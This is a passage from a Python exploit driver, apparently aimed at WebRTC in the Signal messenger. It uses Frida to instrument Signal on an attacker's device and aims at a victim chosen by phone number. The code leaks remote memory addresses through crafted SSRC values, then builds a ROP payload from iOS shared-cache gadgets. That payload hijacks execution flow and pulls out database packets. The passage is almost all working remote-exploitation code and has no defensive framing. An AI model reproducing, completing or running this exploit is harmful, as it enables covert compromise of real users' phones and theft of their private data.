                    target = self.object_queries[lower]
                    addr = int(message["payload"]["val"])
                    if self.debug:
                        log("Leaked address of " + target + ": " + hex(addr),
                            "debug")
                    if target not in self.objects:
                        self.objects[target] = {
                            "addr": addr
                        }
                        if self.handle_leak(target, addr):
                            self.target = self.targets[self.target]["next"]
                    elif target in self.objects and \
                            addr != self.objects[target]:
                        log("WARNING: received another " + target + "address: " + hex(addr))

    def send_leak_message(self):
        """
        Send leak message with sender SSRC set to the target object/address to leak
        """
        if self.target in self.targets:
            addr = self.targets[self.target]["ptr"]
            assert addr is not None, "Target address is none"
        else:
            self.script.post({ "type": "toLeak", "done": True })
            return

        if addr == 0x4141:
            mes = {"type": "toLeak", "toSendUpper": None,
                   "toSendLower": addr}
        else:
            mes = {"type": "toLeak", "toSendUpper": addr >> 32,
                   "toSendLower": addr & 0xffffffff}
        if self.debug:
            log("Sending leak message " + json.dumps(mes), "debug")
        self.object_queries[addr & 0xffffffff] = self.target
        self.script.post(mes)

    def assemble_db(self, data):
        if not self.done:
            log("Received database packet")
            log(binascii.hexlify(data).decode())
            self.script.post({"type": "exit"})
            print("\n")
        self.done = True

    def send_payload(self):
        """
        Send payload to hijack execution flow and wait for leaked database messages
        """
        self.generate_payload()
        log("Sending payload with length " + hex(len(self.payload)), "debug")

        # static const size_t kMaxDtlsPacketLen = 2048;
        if len(self.payload) >= 2016:
            log("Payload too long", "err")
            self.script.post({"type": "exit"})
            self.cleanup()

        # provide payload back to injected android process
        self.script.post(
            {
                "type": "payload",
                "addr": hex(self.worker_thread_stack + 8),
                "len": hex(self.pivot_len),
            },
            self.payload
        )

    def handle(self):
        """
        Setup Driver by spawning Signal and Frida on jailbroken device
        """
        if self.device:
            self.device = frida.get_device(self.device)
        else:
            self.device = frida.get_usb_device()
        log("Connected to Frida device")
        try:
            pid = self.device.get_process("Signal")
            if self.debug:
                log("Killing existing Signal process on device", "debug")
            self.device.kill(pid.pid)
        except frida.ProcessNotFoundError:
            pass
        except Exception as ex:
            print("Got exception", ex, "querying for existing Signal process")
            self.cleanup()
        self.pid = self.device.spawn(["org.thoughtcrime.securesms"])
        log("Attaching to Signal on driver device")
        self.session = self.device.attach(self.pid)
        log("Resuming Signal on driver device")
        self.device.resume(self.pid)
        time.sleep(4)
        log("Loading Frida scripts")
        scripts = self.script.split(",")
        js = ""
        for i in scripts:
            js += open(i, 'r').read() + "\n"
        self.script = self.session.create_script(js)
        self.script.on('message', self.on_message)
        self.script.load()

        # send configuration options
        self.script.post({"type": "config", "debug": self.debug})
        self.script.post({"type": "e164", "e164": self.target_e164})

        log("Starting exploit...")
        # wait for injected process to supply remote base address
        while self.webrtc_base is not None and not self.done:
            time.sleep(2)

        sys.stdin.read()

def sigint_handler(sig, frame):
    global driver
    log("SIGINT received, cleaning up")
    if driver:
        driver.cleanup()
    exit(1)


'''
Global ExploitDriver class. Define as as global to allow cleanup for SIGINT
'''
driver = None

if __name__ == '__main__':
    signal.signal(signal.SIGINT, sigint_handler)

    parser = argparse.ArgumentParser(description="WebRTC Exploit Driver",
                                     formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    parser.add_argument(
        "-l", "--script", help="Javascript Frida client script", required=False, type=str,
        default="call.js,exploit.js")
    parser.add_argument(
        "-d", "--debug", help="Set debug logging", required=False,
        action='store_true')
    parser.add_argument(
        "-D", "--device", help="Thrower device ID connected via USB", type=str,
        required=True)
    parser.add_argument(
        "-c", "--cache", help="Path to ipsw shared cache for target iOS version", type=str,
        required=True)
    parser.add_argument(
        "-s", "--signal", help="Path to target Signal.ipa", type=str,
        required=False)
    parser.add_argument(
        "-g", "--gadgets", help="Path to shared cache gadgets JSON file",
        required=False, default="./gadgets.json", type=str)
    parser.add_argument(
        "-n", "--number", help="Target phone number (E164) with no symbols", type=str,
        required=True)
    args = parser.parse_args()

    if not args.script:
        print("Please provide at least one Javascript Frida client script (e.g script1.js,script.js) <-l>")
        exit(1)

    driver = ExploitDriver(args.script, args.debug, args.gadgets, args.cache,
                           args.device, args.signal, args.number)
    driver.handle()
